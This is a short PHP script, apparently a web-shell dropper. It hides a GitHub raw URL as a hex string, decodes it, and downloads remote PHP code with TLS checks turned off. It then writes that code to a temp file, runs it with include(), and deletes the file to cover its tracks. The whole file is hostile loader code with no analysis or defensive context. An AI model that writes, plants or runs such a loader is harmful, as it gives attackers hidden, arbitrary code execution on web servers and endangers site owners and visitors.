<?php
$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f5041434b444f4c2f7368616c6c6731362f726566732f68656164732f6d61696e2f74696e79';

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

$url = hex2str($hexUrl);

function downloadContent($url) {
    if (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        $result = false;
        if ($fp = fopen($url, 'r')) {
            $result = '';
            while ($data = fread($fp, 8192)) {
                $result .= $data;
            }
            fclose($fp);
        }
        return $result;
    }
}

$phpScript = downloadContent($url);

if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL.");
}

$tempFile = tempnam(sys_get_temp_dir(), 'script_');
file_put_contents($tempFile, $phpScript);

include($tempFile);

unlink($tempFile);
?>
